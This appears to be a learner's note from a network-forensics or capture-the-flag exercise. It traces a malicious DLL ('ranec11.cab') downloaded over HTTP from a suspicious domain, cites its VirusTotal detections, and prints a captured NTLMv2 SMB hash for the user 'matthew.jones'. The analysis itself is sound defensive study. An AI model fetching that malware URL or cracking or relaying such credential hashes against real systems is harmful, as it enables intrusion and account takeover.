looking in to the network connections there's a one connection sus which downloaded a bianry  file from the server ````ncznw6a.com````


![[attachments/Screenshot 2023-01-29 at 00.02.50.png]]

in the below screenshot we can see it downloaded the file called ````ranec11.cab````

```http
GET /dujok/kevyl.php?l=ranec11.cabHTTP/1.1
Host:  ncznw6a.com
Accept:  */*
Accept-Encoding:  gzip, deflate
Accept-Language:  en-US
Connection:  Keep-Alive
User-Agent:  Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E)

HTTP/1.1 200 OK
Connection: close
Content-Length: 304640
Cache-Control: must-revalidate
Content-Description: File Transfer
Content-Disposition: attachment; filename="ranec11.cab"
Content-Type: application/octet-stream
Date:24 GMTExpires: 0
Pragma: public
Server: Apache/2.2.15 (CentOS)X-Powered-By: PHP/7.2.33
```

we manage to extract the bianry file and looking at it its a  PE32 executable 

```
ranec11.cab: PE32 executable (DLL) (GUI) Intel 80386, for MS Windows
```

after de-compiling this also noticed that it imports sus stuff

![[attachments/Screenshot 2023-01-29 at 00.12.16.png]]


also we can look in to this in virus total 

after looking in tot this file 
https://www.virustotal.com/gui/file/054ff4620aaa40928ca67a2c364bedf71d79672874d75ba50ff8231069ad74d9

noticed that 47 security vendors and 2 sandboxes flagged this file as malicious

and after looking in to it the other requests sent to the 

```
*.windowsupdate.com
```

are from this file it seems like. 

----

also looking more into connections we notice there's a smb connection to the destination `PIZZA-BENDER`
and there we can get the smb hashes(NTLMv2-SSP (SMB))  for the `PIZZA-BENDER\matthew.jones`

```bash
matthew.jones::PIZZA-BENDER:6067B255DD14BE31:83C5CC87D581F1683E9D0E0BEFD09F29:010100000000000084ACF34DCC77D60177922BFAAE1339730000000002001800500049005A005A0041002D00420045004E0044004500520001001E00500049005A005A0041002D00420045004E004400450052002D004400430004002000700069007A007A0061002D00620065006E006400650072002E0063006F006D0003004000500069007A007A0061002D00420065006E006400650072002D00440043002E00700069007A007A0061002D00620065006E006400650072002E0063006F006D0005002000700069007A007A0061002D00620065006E006400650072002E0063006F006D000700080084ACF34DCC77D601060004000200000008003000300000000000000000000000002000009D31CAA37E4F10D97BE2501763D84B45EF2BC50105B628E541BDD59A9DB6B5EB0A0010000000000000000000000000000000000009002A0063006900660073002F00500049005A005A0041002D00420045004E004400450052002E0043004F004D000000000000000000
```


---

fyi  -> this is a graph of netowk connections the user used.

![[attachments/Screenshot 2023-01-29 at 00.21.39.png]]

